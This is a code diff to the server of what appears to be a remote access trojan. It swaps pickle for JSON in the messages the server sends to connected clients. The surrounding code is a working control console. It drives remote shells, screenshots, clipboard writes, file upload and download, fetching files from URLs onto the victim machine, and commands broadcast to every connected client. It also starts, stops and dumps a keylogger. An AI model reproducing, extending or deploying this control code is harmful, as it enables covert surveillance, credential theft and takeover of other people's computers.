@@ -1,6 +1,6 @@
+import json
 import logging
 import os
-import pickle
 import socket
 import sys
 import threading
@@ -99,6 +99,9 @@ def public_bytes(publicKey):
     )
     return serializedPublic
 
+def json_dumps(data):
+    return json.dumps(data).encode()
+
 
 class MultiServer(object):
 
@@ -178,20 +181,18 @@ class MultiServer(object):
                 clientPublic = serialization.load_pem_public_key(conn.recv(20480), backend=default_backend())
                 conn.send(public_bytes(publicKey))
 
-                intBuffer = int(conn.recv(20480))
+                def recv_data(conn):
+                    buffer = int(conn.recv(4096).decode())
+                    conn.send(b'<RECEIVED>')
+                    data = self.recvall(conn, buffer)
+                    conn.send(b'<RECEIVED>')
+                    return data
 
-                conn.send(b'<RECEIVED>')
-
-                data = self.recvall(conn, intBuffer)
-                conn.send(b'<RECEIVED>')
-                
-                unpacked_data = pickle.loads(data)
-
-                Hashed_Key = unpacked_data['Hashed_Key']
-                Encrypted = unpacked_data['Encrypted']
-                Hash_Encrypted = unpacked_data['Hash_Encrypted']
-                Signature = unpacked_data['Signature']
-                Encrypted_Signature = unpacked_data['Encrypted_Signature']
+                Hashed_Key = recv_data(conn)
+                Encrypted = recv_data(conn)
+                Hash_Encrypted = recv_data(conn)
+                Signature = recv_data(conn)
+                Encrypted_Signature = recv_data(conn)
 
                 Encrypted_Verify = verifySignature(clientPublic, Encrypted_Signature, Hash_Encrypted)
                 logging.debug('Encrypted Hash Signature Verification: {}'.format(str(Encrypted_Verify)))
@@ -274,7 +275,9 @@ class MultiServer(object):
         save_as = input('Save as: ')
         with open(file_to_transfer, 'rb') as f:
             content = f.read()
-        self.send(conn, pickle.dumps(['--s', save_as, content]))
+        self.send(conn, json_dumps(['--s', save_as]))
+        self.receive(conn, _print=False)
+        self.send(conn, content)
         self.receive(conn)
 
     def receive_file(self, conn):
@@ -283,10 +286,9 @@ class MultiServer(object):
         file_to_transfer = input('File to Transfer to Server: ')
         save_as = input('Save as: ')
 
-        self.send(conn, pickle.dumps(['--r', file_to_transfer]))
+        self.send(conn, json_dumps(['--r', file_to_transfer]))
         content = self.receive(conn, _print=False)
         if content == b'<TRANSFERERROR>':
-            logging.error('Error Transfering file')
             print('Error Transfering File')
             return
         with open(save_as, 'wb') as f:
@@ -295,7 +297,7 @@ class MultiServer(object):
         return
 
     def screenshot(self, conn):
-        self.send(conn, pickle.dumps(['--g']))
+        self.send(conn, json_dumps(['--g']))
         data = self.receive(conn, _print=False)
         with open('{}.png'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
             f.write(data)
@@ -304,7 +306,7 @@ class MultiServer(object):
 
     def shell(self, conn):
         """ Remote Shell with Client """
-        self.send(conn, pickle.dumps(['cd']))
+        self.send(conn, json_dumps(['cd']))
         cwd = self.receive(conn, _print=False).decode()
         command = ''
 
@@ -313,10 +315,10 @@ class MultiServer(object):
             if command == 'quit':
                 break
             if command[:2].lower() == 'cd':
-                self.send(conn, pickle.dumps([command]))
+                self.send(conn, json_dumps([command]))
                 cwd = self.receive(conn, _print=False).decode()
                 continue
-            self.send(conn, pickle.dumps([command]))
+            self.send(conn, json_dumps([command]))
             try:
                 while 1:
                     output = self.receive(conn, _print=False)
@@ -327,7 +329,7 @@ class MultiServer(object):
                         print(output.decode())
                     except UnicodeDecodeError:
                         print(output)
-                    self.send(conn, pickle.dumps(['<LISTENING>']))
+                    self.send(conn, json_dumps(['<LISTENING>']))
             except KeyboardInterrupt:
                 print('Keyboard Interrupt')
                 self.send(conn, b'--q')
@@ -344,27 +346,27 @@ class MultiServer(object):
                 continue
             if '--c' in command:
                 text_to_copy = input('Text to copy: ')
-                self.send(conn, pickle.dumps(['--c', text_to_copy]))
+                self.send(conn, json_dumps(['--c', text_to_copy]))
                 self.receive(conn, _print=False)
                 print('Copied Successfully')
                 continue
             if '--u' in command:
-                self.send(conn, pickle.dumps(['--u']))
+                self.send(conn, json_dumps(['--u']))
                 info = self.all_addresses[self.all_connections.index(conn)]
                 print('IP : {}\nPort: {}\nPC Name: {}'.format(info[0], info[1], info[2]))
                 self.receive(conn)
                 continue
             if command[:3] == '--k':
                 if command[4:].strip() == 'start':
-                    self.send(conn, pickle.dumps(['--k start']))
+                    self.send(conn, json_dumps(['--k start']))
                     self.receive(conn)
                     continue
                 if command[4:].strip() == 'stop':
-                    self.send(conn, pickle.dumps(['--k stop']))
+                    self.send(conn, json_dumps(['--k stop']))
                     self.receive(conn)
                     continue
                 if command[4:].strip() == 'dump':
-                    self.send(conn, pickle.dumps(['--k dump']))
+                    self.send(conn, json_dumps(['--k dump']))
                     data = self.receive(conn, _print=False)
                     if data == b'<NOTRUNNING>':
                         print('Keylogger not running\n')
@@ -374,13 +376,13 @@ class MultiServer(object):
                     print('Logs saved')
                     continue
             if '--p' in command:
-                self.send(conn, pickle.dumps(['--p']))
+                self.send(conn, json_dumps(['--p']))
                 self.receive(conn)
                 continue
             if '--d' in command:
                 file_url = input('File URL: ')
                 file_name = input('Filename: ')
-                self.send(conn, pickle.dumps(['--d', file_url, file_name]))
+                self.send(conn, json_dumps(['--d', file_url, file_name]))
                 self.receive(conn)
                 continue
             if '--s' in command:
@@ -409,7 +411,7 @@ class MultiServer(object):
                     if len(command) > 4:
                         for client in self.all_connections:
                             try:
-                                self.send(client, pickle.dumps([command[4:]]))
+                                self.send(client, json_dumps([command[4:]]))
                                 print('Response from {}: '.format(self.all_addresses[self.all_connections.index(client)][0]))
                                 while 1:
                                     response = self.receive(client, _print=False)
